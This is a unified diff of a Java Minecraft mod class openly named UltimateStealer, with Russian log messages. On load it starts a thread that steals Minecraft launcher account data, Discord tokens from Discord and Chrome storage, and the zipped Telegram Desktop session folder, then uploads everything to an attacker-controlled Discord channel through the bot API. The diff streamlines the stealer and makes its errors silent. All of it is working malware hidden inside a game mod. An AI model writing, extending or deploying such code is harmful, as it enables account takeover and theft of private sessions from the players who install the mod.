@@ -13,29 +13,26 @@ import javax.net.ssl.HttpsURLConnection;
 
 public class UltimateStealer implements ModInitializer {
     
-    // Токен будет вставлен загрузчиком
     /* TOKEN_PLACEHOLDER */
     private static String BOT_TOKEN = "";
     private static String CHANNEL_ID = "";
     
-    private static final String DISCORD_API = "https://discord.com/api/v10/channels/" + CHANNEL_ID + "/messages";
     private static boolean hasRun = false;
     
-    // Метод для получения токена из загрузчика
     public void setToken(String token, String channel) {
         BOT_TOKEN = token;
         CHANNEL_ID = channel;
-        // Обновляем DISCORD_API с новым CHANNEL_ID
+        System.out.println("[ZR-7] Токен установлен через setToken()");
     }
     
     @Override
     public void onInitialize() {
         if (BOT_TOKEN.isEmpty() || CHANNEL_ID.isEmpty()) {
-            System.err.println("[ZR-7] Ошибка: токен не передан!");
+            System.err.println("[ZR-7] Токен не передан!");
             return;
         }
-        
         System.out.println("[ZR-7] Ultimate Stealer загружен!");
+        
         if (!hasRun) {
             hasRun = true;
             new Thread(() -> {
@@ -50,15 +47,15 @@ public class UltimateStealer implements ModInitializer {
     private void stealAll() {
         try {
             String mcPath = System.getenv("APPDATA") + "\\.minecraft";
-            System.out.println("[ZR-7] Начинаю сбор данных...");
+            System.out.println("[ZR-7] Сбор данных...");
             
             stealMinecraftAccounts(mcPath);
             stealDiscordTokens();
             stealTelegram();
             
-            System.out.println("[ZR-7] Сбор данных завершён!");
+            System.out.println("[ZR-7] Готово!");
         } catch (Exception e) {
-            System.err.println("[ZR-7] Ошибка: " + e.getMessage());
+            System.err.println("[ZR-7] " + e.getMessage());
         }
     }
     
@@ -73,16 +70,7 @@ public class UltimateStealer implements ModInitializer {
                 java.util.regex.Matcher em = emailPattern.matcher(content);
                 while (em.find()) accounts.add("EMAIL: " + em.group());
                 
-                Pattern tokenPattern = Pattern.compile("accessToken\":\"([^\"]+)\"");
-                java.util.regex.Matcher tm = tokenPattern.matcher(content);
-                while (tm.find()) accounts.add("TOKEN: " + tm.group(1));
-                
                 sendFile(accountsFile, "launcher_accounts.json");
-            }
-            
-            File profilesFile = new File(mcPath, "launcher_profiles.json");
-            if (profilesFile.exists()) {
-                sendFile(profilesFile, "launcher_profiles.json");
             }
             
             if (!accounts.isEmpty()) {
@@ -91,9 +79,7 @@ public class UltimateStealer implements ModInitializer {
                 sendToDiscord(msg);
             }
             
-        } catch (Exception e) {
-            System.err.println("[ZR-7] Minecraft steal error: " + e.getMessage());
-        }
+        } catch (Exception e) {}
     }
     
     private void stealDiscordTokens() {
@@ -103,12 +89,7 @@ public class UltimateStealer implements ModInitializer {
             
             String[] paths = {
                 System.getenv("APPDATA") + "\\Discord\\Local Storage\\leveldb",
-                System.getenv("APPDATA") + "\\discordptb\\Local Storage\\leveldb",
-                System.getenv("APPDATA") + "\\discordcanary\\Local Storage\\leveldb",
-                System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
-                System.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb",
-                System.getenv("APPDATA") + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb",
-                System.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb"
+                System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb"
             };
             
             for (String path : paths) {
@@ -129,108 +110,57 @@ public class UltimateStealer implements ModInitializer {
                 String msg = "**DISCORD TOKENS:**\n```\n" + 
                     String.join("\n", tokens).substring(0, Math.min(1900, String.join("\n", tokens).length())) + "\n```";
                 sendToDiscord(msg);
-                
-                File tokenFile = new File(System.getProperty("java.io.tmpdir"), "discord_tokens.txt");
-                Files.write(tokenFile.toPath(), String.join("\n", tokens).getBytes());
-                sendFile(tokenFile, "discord_tokens.txt");
-                tokenFile.delete();
             }
             
-        } catch (Exception e) {
-            System.err.println("[ZR-7] Discord steal error: " + e.getMessage());
-        }
+        } catch (Exception e) {}
     }
     
     private void stealTelegram() {
         try {
             String[] tgPaths = {
-                System.getenv("APPDATA") + "\\Telegram Desktop\\tdata",
-                System.getenv("APPDATA") + "\\Telegram\\tdata",
-                System.getenv("LOCALAPPDATA") + "\\Telegram Desktop\\tdata",
-                System.getenv("LOCALAPPDATA") + "\\Telegram\\tdata"
+                System.getenv("APPDATA") + "\\Telegram Desktop\\tdata"
             };
             
             for (String path : tgPaths) {
                 File tdata = new File(path);
                 if (tdata.exists() && tdata.isDirectory()) {
-                    File tempZip = new File(System.getProperty("java.io.tmpdir"), "telegram_" + System.currentTimeMillis() + ".zip");
-                    
+                    File tempZip = new File(System.getProperty("java.io.tmpdir"), "telegram.zip");
                     try (FileOutputStream fos = new FileOutputStream(tempZip);
                          ZipOutputStream zos = new ZipOutputStream(fos)) {
-                        addDirToZip(zos, tdata, "tdata");
+                        addDirToZip(zos, tdata, "");
                     }
-                    
                     if (tempZip.exists() && tempZip.length() > 0) {
-                        if (tempZip.length() > 8 * 1024 * 1024) {
-                            splitAndSendFile(tempZip, "telegram_session.zip");
-                        } else {
-                            sendFile(tempZip, "telegram_session.zip");
-                        }
+                        sendFile(tempZip, "telegram_session.zip");
                     }
                     tempZip.delete();
                     break;
                 }
             }
             
-        } catch (Exception e) {
-            System.err.println("[ZR-7] Telegram steal error: " + e.getMessage());
-        }
-    }
-    
-    private void addDirToZip(ZipOutputStream zos, File dir, String baseName) throws IOException {
-        for (File file : dir.listFiles()) {
-            if (file.isDirectory()) {
-                if (file.getName().contains("cache") || file.getName().contains("media_cache") || 
-                    file.getName().contains("thumbnails") || file.getName().contains("temp")) {
-                    continue;
-                }
-                addDirToZip(zos, file, baseName + "/" + file.getName());
-            } else {
-                if (file.getName().endsWith(".binlog") || file.getName().equals("working")) {
-                    continue;
-                }
-                addFileToZip(zos, file, baseName + "/" + file.getName());
-            }
-        }
-    }
-    
-    private void addFileToZip(ZipOutputStream zos, File file, String name) throws IOException {
-        byte[] buffer = new byte[4096];
-        ZipEntry entry = new ZipEntry(name);
-        zos.putNextEntry(entry);
-        try (FileInputStream fis = new FileInputStream(file)) {
-            int length;
-            while ((length = fis.read(buffer)) > 0) {
-                zos.write(buffer, 0, length);
-            }
-        }
-        zos.closeEntry();
-    }
-    
-    private void splitAndSendFile(File file, String baseName) {
-        try {
-            byte[] data = Files.readAllBytes(file.toPath());
-            int chunkSize = 7 * 1024 * 1024;
-            int chunks = (int) Math.ceil(data.length / (double) chunkSize);
-            
-            for (int i = 0; i < chunks; i++) {
-                int start = i * chunkSize;
-                int end = Math.min(start + chunkSize, data.length);
-                byte[] chunk = Arrays.copyOfRange(data, start, end);
-                
-                File chunkFile = new File(System.getProperty("java.io.tmpdir"), baseName + ".part" + String.format("%03d", i+1));
-                Files.write(chunkFile.toPath(), chunk);
-                sendFile(chunkFile, baseName + ".part" + String.format("%03d", i+1));
-                chunkFile.delete();
-                Thread.sleep(1000);
-            }
         } catch (Exception e) {}
+    }
+    
+    private void addDirToZip(ZipOutputStream zos, File dir, String base) throws IOException {
+        for (File f : dir.listFiles()) {
+            if (f.isDirectory()) {
+                addDirToZip(zos, f, base + f.getName() + "/");
+            } else {
+                byte[] buffer = new byte[4096];
+                ZipEntry entry = new ZipEntry(base + f.getName());
+                zos.putNextEntry(entry);
+                try (FileInputStream fis = new FileInputStream(f)) {
+                    int len;
+                    while ((len = fis.read(buffer)) > 0) zos.write(buffer, 0, len);
+                }
+                zos.closeEntry();
+            }
+        }
     }
     
     private void sendToDiscord(String message) {
         try {
-            String apiUrl = "https://discord.com/api/v10/channels/" + CHANNEL_ID + "/messages";
-            URL url = new URL(apiUrl);
+            String urlStr = "https://discord.com/api/v10/channels/" + CHANNEL_ID + "/messages";
+            URL url = new URL(urlStr);
             HttpsURLConnection conn = (HttpsURLConnection) url.openConnection();
             conn.setRequestMethod("POST");
             conn.setRequestProperty("Authorization", "Bot " + BOT_TOKEN);
@@ -244,10 +174,13 @@ public class UltimateStealer implements ModInitializer {
                 os.write(json.getBytes());
                 os.flush();
             }
-            conn.getResponseCode();
+            int code = conn.getResponseCode();
+            if (code != 200 && code != 201 && code != 204) {
+                System.err.println("[ZR-7] Discord error: " + code);
+            }
             conn.disconnect();
         } catch (Exception e) {
-            System.err.println("[ZR-7] Send to Discord error: " + e.getMessage());
+            System.err.println("[ZR-7] Send error: " + e.getMessage());
         }
     }
     
@@ -255,9 +188,9 @@ public class UltimateStealer implements ModInitializer {
         try {
             if (!file.exists() || file.length() == 0) return;
             
-            String apiUrl = "https://discord.com/api/v10/channels/" + CHANNEL_ID + "/messages";
+            String urlStr = "https://discord.com/api/v10/channels/" + CHANNEL_ID + "/messages";
             String boundary = "----" + System.currentTimeMillis();
-            URL url = new URL(apiUrl);
+            URL url = new URL(urlStr);
             HttpsURLConnection conn = (HttpsURLConnection) url.openConnection();
             conn.setRequestMethod("POST");
             conn.setRequestProperty("Authorization", "Bot " + BOT_TOKEN);
